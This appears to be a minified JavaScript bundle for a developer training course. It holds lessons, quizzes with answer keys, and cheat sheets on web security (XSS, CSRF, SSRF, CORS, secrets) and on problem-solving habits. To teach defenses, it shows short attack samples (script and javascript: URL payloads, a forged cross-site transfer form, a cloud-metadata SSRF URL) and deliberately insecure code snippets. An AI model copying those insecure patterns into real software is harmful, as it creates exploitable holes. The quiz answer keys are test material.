<p v-html="comment"></p>      <!-- ❌ raw HTML -->`}},{type:"list",items:["Must show user HTML (rich text)? **Sanitize** it first with a library like DOMPurify, using an allowlist of tags.","Check URLs from users: `javascript:alert(1)` is a valid `href`. Allow only `http:` and `https:`.","Avoid `innerHTML`, `document.write` and `eval` with user data.","`HttpOnly` cookies stop a script from **reading** the session cookie — but XSS can still call your API as the user.","A **Content Security Policy** (CSP) header is a strong extra layer: it limits which scripts can run."]}],remember:"Render user data as text. Raw HTML (dangerouslySetInnerHTML, v-html) only after sanitizing.",questions:[{id:"security.xss.1",kind:"code",difficulty:"easy",prompt:"`user.bio` contains `<script>alert(1)<\/script>`. What does this React component show?",code:{lang:"ts",text:`function Profile({ user }: { user: User }) {
  return <div>{user.bio}</div>;
}`},choices:["An alert box pops up when the page loads","React throws an error about unsafe HTML","The tag is shown on screen as plain text","An empty div, because React strips the tag"],answer:2,why:"React escapes values in `{}`. The browser shows the characters `<script>...` on screen and does not run them."},{id:"security.xss.2",kind:"scenario",difficulty:"medium",prompt:'Product wants bold text and links in user comments. A developer proposes `<div v-html="comment">`. What should you do?',choices:["Fine — Vue cleans v-html for you","Sanitize the HTML with an allowlist first","Fine, as long as comments are saved in the database","Fine, as long as the page uses HTTPS"],answer:1,why:"`v-html` inserts raw HTML with no cleaning. Sanitize on the server or client with an allowlist (DOMPurify), or use Markdown with a safe renderer.",remember:"v-html / dangerouslySetInnerHTML = you are responsible."},{id:"security.xss.3",kind:"code",difficulty:"hard",prompt:'Users can set a "website" link in their profile. What is the risk here?',code:{lang:"ts",text:"<a href={user.website}>Website</a>"},choices:["None, React escapes every value in JSX","Very long URLs can break the page layout","The link opens in the same tab, not a new one","A `javascript:` URL can run code on click"],answer:3,why:"Escaping protects text, not the meaning of a URL. `javascript:...` is a valid href. Do not rely on the framework here: validate that the URL starts with `http:` or `https:`."},{id:"security.xss.4",kind:"mcq",difficulty:"medium",prompt:"Your session cookie is `HttpOnly`. An XSS bug exists on your site. What can the attacker's script still do?",choices:["Call your API as the victim","Nothing — HttpOnly blocks XSS","Only read `document.cookie`","Only change the page CSS"],answer:0,why:"The script runs inside your page, so its requests carry the victim's cookie automatically. HttpOnly only stops stealing the cookie value. Fix the XSS itself."}]},{id:"security.csrf",title:"CSRF: requests the user did not mean to send",summary:"Your cookie, their request.",minutes:3,blocks:[{type:"text",text:"Browsers attach cookies **automatically**. **CSRF** (cross-site request forgery) abuses this: another website makes the user's browser send a request to **your** site, and the user's cookie goes with it."},{type:"diagram",text:`1. User logs in to bank.example → cookie sid=...
2. User opens evil.example in another tab
3. evil page auto-submits a hidden form:
     POST https://bank.example/transfer
     to=attacker&amount=1000
4. Browser adds the bank cookie 🍪
   → bank sees a "real" logged-in request`},{type:"text",text:"The attacker cannot read the response. They do not need to — the damage is the **action** itself."},{type:"list",items:["**SameSite cookies**: `Lax` stops the cookie on cross-site POSTs; `Strict` stops it on all cross-site requests. Chrome treats cookies without SameSite as `Lax`, but not every browser does — set it yourself.","**Anti-forgery token**: a random value in the form or a header that evil.example cannot know. ASP.NET Core: `[ValidateAntiForgeryToken]` / the antiforgery services.","**Never change data with GET.**","APIs that use `Authorization: Bearer` tokens (not cookies) are mostly safe from CSRF: the browser does not add that header on its own."]},{type:"code",code:{lang:"http",text:"Set-Cookie: sid=a8f3k2; HttpOnly; Secure; SameSite=Lax"}}],remember:"CSRF = your cookie, their request. Defend with SameSite + anti-forgery tokens. No state changes on GET.",questions:[{id:"security.csrf.1",kind:"scenario",difficulty:"medium",prompt:'Your API uses cookie auth. A teammate says: "CORS only allows our domain, so CSRF is impossible." Are they right?',choices:["Yes, CORS stops the request from being sent","Yes, if the cookie is also HttpOnly","No, CORS only stops reading responses, not a form POST","No, because CORS only applies to GET"],answer:2,why:"A plain HTML form POST is sent without any CORS check. The browser adds the cookie, and the server performs the action. CORS only decides who may **read** the response.",remember:"CORS does not stop CSRF."},{id:"security.csrf.2",kind:"mcq",difficulty:"medium",prompt:"Why does an anti-forgery token stop CSRF?",choices:["It encrypts the session cookie","It blocks all cross-origin requests","The evil site cannot know the token value","It makes the cookie HttpOnly"],answer:2,why:"The server checks for a secret token that only your own pages receive. The evil site can make the browser send the cookie, but it cannot read your page to get the token."},{id:"security.csrf.3",kind:"compare",difficulty:"hard",prompt:"Which of these APIs is **most** exposed to CSRF?",choices:["Uses a session cookie with `SameSite=None` and no anti-forgery token","Uses `Authorization: Bearer` with a token kept in JS memory","Uses a session cookie with `SameSite=Strict`","Server-to-server API with an API key header"],answer:0,why:"`SameSite=None` tells the browser to send the cookie even on requests started by other sites, and nothing else checks where the request came from. Bearer headers and API keys are not added automatically."}]},{id:"security.ssrf-cors",title:"SSRF and the CORS myth",summary:"Your server fetching evil URLs, and what CORS does not protect.",minutes:4,blocks:[{type:"text",text:"**SSRF** (server-side request forgery): your server fetches a URL that the **user** chose. The attacker picks a URL that only your server can reach."},{type:"code",code:{lang:"csharp",text:`// "Import avatar from URL" feature
[HttpPost("avatar/import")]
public async Task<IActionResult> Import(string url)
{
    var bytes = await http.GetByteArrayAsync(url); // ❌ any URL
    // ...
}`}},{type:"list",items:["Attacker sends `http://169.254.169.254/...` — the cloud metadata service, which can expose credentials.","Or `http://localhost:8080/admin`, or an internal service on `10.x.x.x`.","Defense: **allowlist** hosts when you can (e.g. only your CDN).","Otherwise: allow only `https`, and block private, loopback and link-local IPs **after** the DNS lookup. Re-check on redirects (or turn redirects off).","Network rules: the fetcher should not be able to reach internal services at all."]},{type:"text",text:"**CORS is not a firewall.** It tells **browsers** which other sites may read your responses. curl, Postman, scripts and servers ignore it. It never stops a request from reaching your API."},{type:"compare",left:{title:"CORS does",items:["Let browsers share responses with allowed origins","Stop evil sites from reading your API with a user's cookies"]},right:{title:"CORS does not",items:["Block curl, bots or scripts","Replace authentication or authorization","Stop a form POST from being sent (CSRF)"]}},{type:"example",title:"A dangerous config",text:"Reflecting **any** `Origin` back in `Access-Control-Allow-Origin` together with `Allow-Credentials: true` means every website can read your logged-in users' data through their browsers."}],remember:"Never fetch any URL a user gives you. CORS protects browsers, not your server.",questions:[{id:"security.ssrf-cors.1",kind:"scenario",difficulty:"hard",prompt:"In the avatar import feature, an attacker submits `http://169.254.169.254/latest/meta-data/`. Why is this dangerous?",choices:["The response is a huge file that can fill the disk","Your server can reach internal hosts the attacker cannot","It triggers a CORS error that breaks the import page","It is a link-local IP, so the request loops back forever"],answer:1,why:"The request comes from inside your network. The metadata service and internal APIs trust it. If the response is shown or stored, the attacker may read secrets like cloud credentials.",remember:"SSRF = your server becomes the attacker's proxy."},{id:"security.ssrf-cors.2",kind:"debug",difficulty:"medium",prompt:"Your public API only allows `https://app.example.com` in CORS. A scraper still downloads all your product data with a script. Why?",choices:["CORS is checked only by browsers","The CORS policy is misconfigured","The scraper uses HTTPS","The scraper uses an older CORS version"],answer:0,why:"Scripts and servers do not apply CORS. To control access, use authentication, authorization and rate limiting."},{id:"security.ssrf-cors.3",kind:"code",difficulty:"hard",prompt:"The API uses cookie authentication. What is the risk of this CORS setup?",code:{lang:"csharp",text:`builder.Services.AddCors(o => o.AddDefaultPolicy(p => p
    .SetIsOriginAllowed(_ => true)   // any origin
    .AllowCredentials()
    .AllowAnyHeader()
    .AllowAnyMethod()));`},choices:["None, CORS only matters in browsers anyway","It blocks your own frontend from calling the API","Any website can read logged-in users' API data","Browsers stop sending cookies to this API"],answer:2,why:"An evil site can call your API from a victim's browser with `credentials: 'include'`. The cookie is sent, and this policy allows the evil site to read the answer. Allow only your known origins."}]},{id:"security.secrets-https",title:"Secrets and HTTPS",summary:"Keys out of git, out of the bundle, and encrypted on the wire.",minutes:4,blocks:[{type:"text",text:"A **secret** is anything that gives access: DB passwords, API keys, JWT signing keys, connection strings."},{type:"compare",left:{title:"Never put secrets in",items:["Git — history keeps them forever","Frontend code — the bundle is public","Logs and error messages"]},right:{title:"Put them in",items:["Dev: `dotnet user-secrets`, local `.env` (git-ignored)","Prod: environment variables or a vault (Azure Key Vault, AWS Secrets Manager)","Your backend — the browser calls the backend, the backend calls the paid API"]}},{type:"text",text:"In Vite, any `VITE_*` variable is copied into the JavaScript bundle. Anyone can open DevTools and read it. Same idea for other frontend build tools."},{type:"example",title:"Leaked a key?",text:"Deleting the line is not enough. **Rotate** first: create a new key and disable the old one. Then clean up the code and history."},{type:"text",text:"**HTTPS** encrypts traffic and proves the server is who it says it is (the certificate). Without it, anyone on the same Wi-Fi or network path can read or change requests: passwords, cookies, tokens."},{type:"code",code:{lang:"csharp",text:`// ❌ "fixes" a certificate error by trusting ANY certificate
var handler = new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (_, _, _, _) => true
};`}},{type:"list",items:["HTTPS everywhere, plus **HSTS** so browsers refuse plain HTTP for your site.","Never turn off certificate checks in production. Fix the certificate instead.","HTTPS protects data **in transit** only. It does not fix SQL injection, XSS or weak passwords."]}],remember:"Secrets live on the server, outside git. Leaked → rotate. HTTPS protects the wire, not your code.",questions:[{id:"security.secrets-https.1",kind:"scenario",difficulty:"easy",prompt:"A developer commits an API key, notices, and pushes a new commit that deletes it. Is it safe now?",choices:["Yes, the key is gone from the code","Yes, if the repository is private","No, it is in git history; rotate the key","No, but rewriting git history alone fixes it"],answer:2,why:"The old commit still has the key, and clones or forks may already exist. Rewriting history does not undo copies. Only rotating the key makes the leaked one useless.",remember:"Leaked secret → rotate first."},{id:"security.secrets-https.2",kind:"code",difficulty:"medium",prompt:"A React + Vite app has this setup. What is the problem?",code:{lang:"ts",text:`// .env
// VITE_PAYMENT_SECRET_KEY=sk_live_abc123

await fetch('https://api.payments.example/charges', {
  method: 'POST',
  headers: {
    Authorization: \`Bearer \${import.meta.env.VITE_PAYMENT_SECRET_KEY}\`,
  },
  body: JSON.stringify(charge),
});`},choices:["The secret key ends up in the public JS bundle","Vite encrypts env variables, so it is fine","`.env` files only work in production","The variable name is too long"],answer:0,why:"Vite replaces `import.meta.env.VITE_*` with the real value at build time. Anyone can read it in the browser. Secret keys must stay on your backend."},{id:"security.secrets-https.3",kind:"debug",difficulty:"medium",prompt:'Calls to an internal API fail with a certificate error. A developer "fixes" it with a callback that always returns `true`. What did they break?',choices:["Nothing, the traffic is still encrypted","Anyone in the middle can pretend to be the API","Only performance gets worse","JSON parsing of the response"],answer:1,why:"Encryption is useless if you do not check who is on the other end. An attacker can present their own certificate, read everything, and pass it on."},{id:"security.secrets-https.4",kind:"mcq",difficulty:"easy",prompt:"Your site uses HTTPS everywhere. Which of these does HTTPS protect against?",choices:["An attacker typing SQL injection into the search box","Stored XSS hidden in user comments on the site","Someone on café Wi-Fi reading the session cookie","A weak password hash leaked from the database"],answer:2,why:"HTTPS protects data while it travels. The other problems live in your code and database, and HTTPS does nothing for them."}]}],cheatSheet:[{title:"Attack → defense",items:[{term:"SQL injection",meaning:"Input becomes SQL → parameters, allowlist for column names"},{term:"XSS",meaning:"Input becomes script → escape by default, sanitize raw HTML, CSP"},{term:"CSRF",meaning:"Other site uses your cookie → SameSite + anti-forgery token, no writes on GET"},{term:"SSRF",meaning:"Server fetches attacker URL → allowlist hosts, block internal IPs"},{term:"IDOR",meaning:"Change the id, see others' data → check ownership on the server"},{term:"Over-posting",meaning:"Body sets fields like IsAdmin → bind to DTOs, not entities"}]},{title:"Passwords",items:[{term:"Use",meaning:"Argon2id, bcrypt or PBKDF2 (library) + unique salt per user"},{term:"Never",meaning:"Plain text, encryption, MD5/SHA-1/SHA-256 alone"},{term:"Salt",meaning:"Random per user → same password, different hash"},{term:"Login errors",meaning:'"Wrong email or password" — do not reveal which'},{term:"Brute force",meaning:"Rate limit / lockout on login"}]},{title:"Secrets & transport",items:[{term:"Secrets",meaning:"Not in git, not in the frontend bundle, not in logs"},{term:"VITE_* vars",meaning:"Public — they are copied into the JS bundle"},{term:"Leaked key",meaning:"Rotate first, then clean up"},{term:"HTTPS",meaning:"Encrypts + verifies server; protects transit only"},{term:"Cert errors",meaning:'Fix the cert — never "trust all" in production'},{term:"Least privilege",meaning:"Each user/service/DB login gets only what it needs"}]},{title:"Myths",items:[{term:'"CORS protects my API"',meaning:"✗ Only browsers apply it; curl ignores it"},{term:'"The button is hidden"',meaning:"✗ UI is not authorization; check on the server"},{term:'"Frontend validates it"',meaning:"✗ Attackers call the API directly"},{term:'"The JWT is encrypted"',meaning:"✗ Payload is readable; only tamper-proof"},{term:'"We use HTTPS, so we are secure"',meaning:"✗ HTTPS does not fix bugs in your code"}]}]},A=Object.freeze(Object.defineProperty({__proto__:null,default:T},Symbol.toStringTag,{value:"Module"})),S={id:"thinking",title:"Thinking",emoji:"🧠",tagline:"Understand, split, test the edges, measure",lessons:[{id:"thinking.understand",title:"Understand the problem first",summary:'Know what "done" looks like before you code.',minutes:3,blocks:[{type:"text",text:`Most bugs are not typing mistakes. They come from solving the **wrong problem**, or only half of the right one.
Before you write code (or ask an AI to write it), make sure you can say what "done" looks like.`},{type:"list",items:["**Inputs** — what goes in? From where?","**Outputs** — what comes out? In what shape?","**Rules** — what must always happen? What must never happen?","**Examples** — can you write 2–3 real examples, including one weird one?"]},{type:"example",title:'"Add a search box"',text:`Search what? Only names, or emails too? Exact match or "contains"? Upper/lower case? What if there are 50,000 results?
Five minutes of questions can save two days of rework.`},{type:"text",text:'A simple trick: **say the problem back in your own words**. "So you want X when Y, and Z otherwise — right?" If the answer is "not quite", you just saved time.'},{type:"diagram",text:`Vague request
     ↓
Say it back  →  "Did I get this right?"
     ↓
Concrete examples (normal + weird)
     ↓
Definition of done
     ↓
Code`}],remember:"If you cannot write an example input and output, you are not ready to code.",questions:[{id:"thinking.understand.1",kind:"scenario",difficulty:"easy",prompt:'Your lead says: "Make the export faster." What do you do first?',choices:["Move the export to a background job so users never wait for it","Add a cache in front of the export queries so repeat runs are quick","Ask which export, how slow it is now, and the target time","Profile every endpoint in the app to find all the slow parts"],answer:2,why:'"Faster" has no finish line. You need the current number, the target and the scope. Without them you cannot know when you are done.',remember:"Vague goal → ask for numbers and scope."},{id:"thinking.understand.2",kind:"mcq",difficulty:"medium",prompt:"Why write 2–3 concrete examples (input → expected output) before coding?",choices:["They expose unclear rules early, while changes are cheap","They replace the need for automated tests later in the project","They let you skip code review, since the examples prove it works","They are mainly useful for junior developers who are still learning"],answer:0,why:"When you try to write the expected output for a weird case, you often find you do not know it. Better to find that out before the code exists."},{id:"thinking.understand.3",kind:"scenario",difficulty:"medium",prompt:'You ask an AI: "Write a function that splits a bill between friends." It returns clean code that divides the total by the number of people. What did your request miss?',choices:["Clearer variable names, so the AI understands the intent better","Rules for rounding, the leftover cent, and unequal shares","A class with an interface, so it is easier to extend later","More comments in the code, so the logic is easy to follow"],answer:1,why:"The code solves the problem it was given. The problem was not fully defined: 100 / 3 = 33.33 × 3 = 99.99, so one cent goes missing.",remember:"AI solves the problem you describe — describe the whole problem."},{id:"thinking.understand.4",kind:"truefalse",difficulty:"easy",prompt:"If the code passes all its tests, it solves the user’s problem.",choices:["True","False"],answer:1,why:"Tests check what you **thought** the problem was. If you misunderstood the requirement, the code and the tests are wrong together."}]},{id:"thinking.break-down",title:"Break big problems into small ones",summary:"Small steps you can check.",minutes:4,blocks:[{type:"text",text:'A task like "build checkout" is scary and hard to estimate. Split it until each piece is small enough to **finish and check in a day or less**.'},{type:"diagram",text:`Build checkout
├─ Show cart total
├─ Collect address
│   ├─ Form + validation
│   └─ Save address
├─ Take payment
│   ├─ Call payment API
│   └─ Handle failure / retry
└─ Send confirmation email`},{type:"compare",left:{title:"Layer by layer ⚠️",items:["All tables, then all APIs, then all UI","Nothing works until the end","Problems are found late"]},right:{title:"Thin slices ✅",items:["One small feature, DB to UI","Something works on day 1","Feedback comes early"]}},{type:"text",text:"Solve the **simplest version first**. Make it work for 10 items in memory before 10 million from a file. Then grow it."},{type:"text",text:"Do the **riskiest part early**. If one step uses an API nobody on the team knows, try it first. Bad news is cheaper in week 1 than in week 4."},{type:"example",title:"Stuck?",text:`Name the next smallest step you can test.
"Import the CSV" is hard to start. "Read one row from the file and print it" takes 10 minutes.`}],remember:"Small steps you can check beat big steps you hope will work.",questions:[{id:"thinking.break-down.1",kind:"scenario",difficulty:"medium",prompt:'You must build "import customers from CSV" in 3 days. Which first step is best?',choices:["Design a generic import framework for any file type","Build the full upload UI with a progress bar","Design the database schema for all future imports","Read one real sample file and print the parsed rows"],answer:3,why:"Reading the real file tests the biggest unknowns (format, encoding, strange rows) in an hour. The framework and the UI can wait."},{id:"thinking.break-down.2",kind:"compare",difficulty:"medium",prompt:'Two plans for a new "comments" feature. Which gives you working software and feedback sooner?',choices:['Build "add a comment and see it" end to end, then edit, then delete',"Build all the tables, then all the endpoints, then all the screens"],answer:0,why:'A thin slice works end to end after a day or two. People can try it and say "that is not what I meant" early. Layer by layer shows nothing until the end.',remember:"Slice vertically, not by layer."},{id:"thinking.break-down.3",kind:"mcq",difficulty:"easy",prompt:'Your estimate for a task is "about 2 weeks, not sure". What usually makes it more reliable?',choices:["Multiply it by 3 to add a safe buffer, then commit to that","Split it into pieces of a day or less and estimate each","Ask an AI tool to estimate it from the ticket title and summary","Start coding right away and see how far you get in two days"],answer:1,why:"Small pieces are easier to imagine and estimate. Splitting also shows the parts you do not understand yet — those are where estimates go wrong."},{id:"thinking.break-down.4",kind:"scenario",difficulty:"hard",prompt:"You split a feature into 6 tasks. Task 4 uses an external API nobody on the team has used before. What order makes the most sense?",choices:["Do tasks 1–3 first, then deal with task 4 when you get there","Try a small test call to the unknown API early","Skip task 4 and hope the API is simple","Ask for two more developers just in case"],answer:1,why:"Unknowns are where plans break. A quick early test of the risky part means bad news arrives while there is still time to change the plan.",remember:"Do the riskiest part first."}]},{id:"thinking.edge-cases",title:"Edge cases: where bugs live",summary:"Empty, one, many, the limit, twice.",minutes:4,blocks:[{type:"text",text:'Code usually works for "normal" input. Bugs hide at the **edges**: empty, huge, wrong, or exactly at a limit.'},{type:"list",items:["**Zero / empty** — empty list, empty string, `0`, `null`.","**One** — a single item.","**Many** — 1 million items.","**Boundaries** — first, last, exactly at the limit (`<` vs `<=`).","**Bad input** — negative numbers, wrong format, very long text, emoji.","**Time** — midnight, time zones, daylight saving, Feb 29.","**Twice** — the same request sent two times."]},{type:"code",code:{lang:"ts",text:`function average(nums: number[]): number {
  const sum = nums.reduce((a, b) => a + b, 0);
  return sum / nums.length;
}

average([4, 6]); // 5
average([]);     // NaN  ← 0 / 0`}},{type:"text",text:`For each edge case, **decide on purpose**: return a default, throw a clear error, or reject the input.
The edge case is not the bug. **Not deciding** is the bug.`}],remember:'Test empty, one, many, the limit, and "sent twice".',questions:[{id:"thinking.edge-cases.1",kind:"code",difficulty:"easy",prompt:"What happens when this method gets an empty list?",code:{lang:"csharp",text:`int Max(List<int> items)
{
    var max = items[0];
    foreach (var x in items)
        if (x > max) max = x;
    return max;
}`},choices:["It returns 0, the default value of int","It throws ArgumentOutOfRangeException","It returns int.MinValue because the loop never runs","It throws NullReferenceException on items[0]"],answer:1,why:'`items[0]` on an empty `List<int>` throws. Decide what "max of nothing" means: throw a clear error, or return a nullable / default.'},{id:"thinking.edge-cases.2",kind:"code",difficulty:"medium",prompt:'The rule is: "Orders of 100 or more get free shipping." Which order total shows the bug?',code:{lang:"ts",text:"const freeShipping = total > 100;"},choices:["50","100","150","0"],answer:1,why:'"100 or more" means `>= 100`. With `> 100`, an order of exactly 100 pays for shipping. Always test the exact boundary value.',remember:"Test exactly at the limit."},{id:"thinking.edge-cases.3",kind:"scenario",difficulty:"medium",prompt:'A "Pay" button sends `POST /payments`. Users on slow mobile networks tap it twice. Which edge case must you handle?',choices:["Card numbers that are too long","Users who use dark mode","The same payment request arriving twice","Users who never open the page"],answer:2,why:"Two taps can mean two charges. Disable the button after the first tap, and make the server safe too, for example with an idempotency key so a repeated request is processed only once.",remember:"Ask: what if this is sent twice?"},{id:"thinking.edge-cases.4",kind:"debug",difficulty:"hard",prompt:'An hourly chart of orders "per local day" looks fine almost every day. But on one day in spring it shows 23 bars, and on one day in autumn it shows 25. What is the most likely cause?',choices:["Daylight saving time changes the length of the local day","Leap years add a day in February, which shifts the hour buckets","The server clock drifts on those days and logs the wrong hour","The chart library rounds timestamps and merges or splits bars"],answer:0,why:'In time zones with daylight saving, one local day has 23 hours and another has 25. Store times in UTC and decide clearly which time zone "a day" means.'}]},{id:"thinking.trade-offs",title:"Trade-offs: no free lunch",summary:"Every choice makes something better and something worse.",minutes:3,blocks:[{type:"text",text:'Almost every technical choice improves one thing and hurts another. Experienced developers do not say "X is the best". They say "X is better **here**, because…".'},{type:"diagram",text:`Faster reads   ⇄  slower writes   (indexes)
Speed          ⇄  fresh data      (caching)
Flexible       ⇄  simple          (config, plugins)
Ship today     ⇄  clean code      (tech debt)
Less memory    ⇄  more CPU        (store vs recompute)`},{type:"text",text:`Two questions help you choose:
1. **What matters most here?** Speed, cost, correctness, time to ship?
2. **How hard is it to undo?** Easy-to-undo choices can be made fast. Hard-to-undo ones (database, public API shape) deserve more thought.`},{type:"example",title:"Same tool, different answer",text:`Caching product prices for 5 minutes cuts database load a lot. But a price change can take 5 minutes to show.
For a blog shop: great. For a trading app: not acceptable.`},{type:"text",text:'Write the trade-off down, even in one line in the PR: "Chose X over Y because Z. Downside: W." Future you will thank you.'}],remember:'"It depends" is only a good answer if you say on what.',questions:[{id:"thinking.trade-offs.1",kind:"compare",difficulty:"medium",prompt:"A product page gets 5,000 views per second. Prices change about twice a day, and the business is fine with a short delay. Which is better?",choices:["Cache prices for 60 seconds","Read prices from the database on every request"],answer:0,why:'Prices rarely change, so a delay of up to 60 seconds is acceptable here, and the database does far less work. The "business is fine with it" part is what makes this the right call.'},{id:"thinking.trade-offs.2",kind:"scenario",difficulty:"medium",prompt:'A teammate says: "Let’s make every setting configurable, so we never need to change code again." What is the hidden cost?',choices:["None — more options always make the product more flexible","Reading config files at startup is slower than hard-coded values","More combinations to test, and more ways to break production","Users will be able to read the config and see internal settings"],answer:2,why:"Each option doubles the possible combinations. Many of them are never tested, and a wrong value in production can break things just like a bad deploy."},{id:"thinking.trade-offs.3",kind:"mcq",difficulty:"hard",prompt:"Which decision deserves the most careful thought up front?",choices:["The name of a private helper method","The logging library used inside one module","The order of CSS classes on a button","The shape of a public API used by 30 external clients"],answer:3,why:"You can rename a private method in a minute. Changing a public API means 30 other teams must change their code. The harder to undo, the more thought it deserves.",remember:"Think harder about decisions that are hard to undo."},{id:"thinking.trade-offs.4",kind:"scenario",difficulty:"easy",prompt:"The deadline is Friday. You find a quick fix that works, but it copies some logic from another file. What is a sensible move?",choices:["Ship it, and create a ticket to remove the copy later","Miss the deadline to refactor the whole module","Ship it and tell nobody about the copy","Refuse to ship until the code is perfect"],answer:0,why:"Taking on a little tech debt can be the right trade-off. The key is to make it visible, so it gets paid back instead of being forgotten."}]},{id:"thinking.debugging-mindset",title:"Debug like a scientist",summary:"Hypothesis, test, repeat — not random changes.",minutes:4,blocks:[{type:"text",text:'Changing random things ("let me try this…") is slow and often hides the real bug. Treat a bug like an **experiment**.'},{type:"diagram",text:`1. Reproduce  → make it fail on purpose
2. Observe    → read the error, logs, data
3. Guess      → ONE idea: "X causes it"
4. Test       → change one thing, check again
5. Repeat     → until the idea is proven
6. Fix + test → add a test so it stays fixed`},{type:"text",text:"**Read the whole error message.** The message says **what** failed. The stack trace says **where**. Many people skip it and start guessing."},{type:"text",text:'Ask "**What changed?**" Code, config, data, traffic, library versions, the date. A bug that "came out of nowhere" usually has its cause somewhere in that list.'},{type:"example",title:"Binary search for the bad commit",text:"It worked last week. Today it is broken. There are 40 commits in between.\nTest the commit in the middle. Broken? The bug is in the first half. Works? The second half. About 6 checks find the bad commit. `git bisect` does this for you."}],remember:"Reproduce. One guess at a time. Change one thing at a time.",questions:[{id:"thinking.debugging-mindset.1",kind:"scenario",difficulty:"easy",prompt:"A bug happens in production but not on your machine. What is the best first step?",choices:["Change the code and redeploy until the bug goes away","Collect facts: logs, the exact input, what differs from local","Restart the production servers and hope",'Close the ticket as "cannot reproduce"'],answer:1,why:"You cannot fix what you do not understand. The difference between production and local (data, config, versions, load) usually points to the cause."},{id:"thinking.debugging-mindset.2",kind:"scenario",difficulty:"medium",prompt:"You change three things at once and the bug disappears. What is the problem?",choices:["There is no problem — the bug is gone, so the fix is done","Three changes make the commit too large for a code review","The bug will surely come back, because big fixes never last","You do not know which change fixed it; the others may add bugs"],answer:3,why:"With three changes you have no proof of the cause. Two of them may be useless or harmful. Change one thing, check, then decide.",remember:"One change per experiment."},{id:"thinking.debugging-mindset.3",kind:"debug",difficulty:"medium",prompt:"A feature worked on Monday. On Thursday it is broken. Nobody changed that feature’s code. What helps most?",choices:["Rewrite the feature from scratch so the code is clean and safe","List what else changed: config, data, libraries, other deploys","Ask every user to clear their browser cache and log in again","Read the feature’s code line by line until you spot the bug"],answer:1,why:"Code is only one thing that can change. A new config value, a library update, or new kinds of data can break code that was not touched."},{id:"thinking.debugging-mindset.4",kind:"mcq",difficulty:"hard",prompt:"There are 64 commits between the last good version and the broken one. Each test takes 5 minutes. With binary search, about how many tests do you need?",choices:["64","32","About 6","Exactly 1"],answer:2,why:"Each test cuts the list in half: 64 → 32 → 16 → 8 → 4 → 2 → 1. That is 6 tests, about 30 minutes instead of more than 5 hours."}]},{id:"thinking.measure-first",title:"Measure before you optimize",summary:"The slow part is rarely where you think.",minutes:4,blocks:[{type:"text",text:"Developers are famously bad at guessing where time goes. So: **measure first**, then optimize the biggest cost."},{type:"example",title:"The week that saved 2 ms",text:"A team spent a week making JSON serialization 2× faster. Later they measured: the request took 800 ms, of which 750 ms was one SQL query and 5 ms was JSON. They saved about 2.5 ms."},{type:"diagram",text:`Request: 800 ms
├─ DB query        750 ms  ███████████████
├─ Auth API call    40 ms  █
├─ Business logic    5 ms
└─ JSON              5 ms
→ Fix the biggest bar first.`},{type:"list",items:['**Measure** the current numbers. Not "it feels slow".',"**Find the biggest cost** with a profiler, traces or query stats.","**Change one thing.**","**Measure again** with the same data and conditions.","**Stop** when you reach the target."]},{type:"text",text:"Look at **percentiles**, not only the average. **p95 = 500 ms** means 95% of requests are faster than 500 ms, and 5% are slower. An average can look fine while some users wait a long time."}],remember:"No numbers, no optimization. Fix the biggest bar first.",questions:[{id:"thinking.measure-first.1",kind:"perf",difficulty:"easy",prompt:"An endpoint takes 2 seconds. A trace shows: external API call 1.7 s, database 0.2 s, your C# code 0.1 s. Where do you look first?",choices:["Rewrite the C# loops, because your own code is easiest to change","Add a database index, since queries are usually the bottleneck","The external API call: cache, batch or parallelize it","Upgrade the server CPU so every part of the request runs faster"],answer:2,why:"The external call is 85% of the time. Even making your C# code 10× faster saves only 0.09 s.",remember:"Optimize the biggest part of the trace."},{id:"thinking.measure-first.2",kind:"perf",difficulty:"medium",prompt:"The average response time is 120 ms, which looks fine. But some users complain the app is slow. What do you check next?",choices:["p95 and p99 latency — slow requests hide in the average","Nothing — 120 ms is fast, so the complaints are about something else","The median response time, to see what a typical user gets","The application log level, to see if logging slows it down"],answer:0,why:"If 98 requests take 50 ms and 2 take 3.5 s, the average is about 120 ms. Percentiles show the slow tail that real users feel."},{id:"thinking.measure-first.3",kind:"scenario",difficulty:"medium",prompt:'You optimized a function and it "feels faster". How do you show it really is?',choices:["Ask a colleague if it feels faster to them","Run the same benchmark before and after, with the same data","Check that the new code has fewer lines","Run it once in debug mode and look at the clock"],answer:1,why:"Only a repeatable measurement under the same conditions is evidence. Feelings, line counts and single runs are not."},{id:"thinking.measure-first.4",kind:"mcq",difficulty:"hard",prompt:"A request takes 1,000 ms. Function F takes 100 ms of that. You make F 10× faster. How long does the request take now?",choices:["100 ms","910 ms","500 ms","990 ms"],answer:1,why:"F goes from 100 ms to 10 ms, so you save 90 ms: 1,000 − 90 = 910 ms. Speeding up a small part only helps a little.",remember:"The total gain is limited by how big the part is."}]}],cheatSheet:[{title:"Before coding",items:[{term:"Say it back",meaning:"Repeat the problem in your words — catch misunderstandings early"},{term:"Examples first",meaning:"Write 2–3 input → output pairs, one of them weird"},{term:"Definition of done",meaning:"How will we know it works? Use numbers where possible"},{term:"Thin slice",meaning:"One small feature end to end, instead of layer by layer"},{term:"Riskiest first",meaning:"Test unknown APIs / libraries early"}]},{title:"Edge case checklist",items:[{term:"Empty / null / 0",meaning:"What happens with nothing?"},{term:"One / many",meaning:"A single item? A million items?"},{term:"Boundary",meaning:"Exactly at the limit — `<` vs `<=`"},{term:"Bad input",meaning:"Negative, too long, wrong format, emoji"},{term:"Time",meaning:"Midnight, time zones, daylight saving, Feb 29"},{term:"Twice",meaning:"Same request sent again → make it idempotent"}]},{title:"Debugging & performance",items:[{term:"Reproduce first",meaning:"Make it fail on purpose before fixing"},{term:"One change at a time",meaning:"Otherwise you do not know what fixed it"},{term:"What changed?",meaning:"Code, config, data, versions, traffic, date"},{term:"Binary search / git bisect",meaning:"Halve the range of commits each test"},{term:"Measure → fix → measure",meaning:"Biggest cost first, same conditions each time"},{term:"p95 / p99",meaning:"Slow tail hidden by the average"}]},{title:"Trade-offs",items:[{term:"Cache",meaning:"Faster reads, but data can be stale"},{term:"Index",meaning:"Faster reads, slower writes"},{term:"Configurable",meaning:"Flexible, but more combinations to test"},{term:"Hard to undo",meaning:"Public APIs, data models → think longer"}]}]},I=Object.freeze(Object.defineProperty({__proto__:null,default:S},Symbol.toStringTag,{value:"Module"})),O={id:"web",title:"Web & HTTP",emoji:"🌐",tagline:"Requests, status codes, cookies, CORS — how the web talks",lessons:[{id:"web.request-response",title:"One request, one response",summary:"What really travels between browser and server.",minutes:3,blocks:[{type:"text",text:`**HTTP** is how a browser or an app talks to a server.
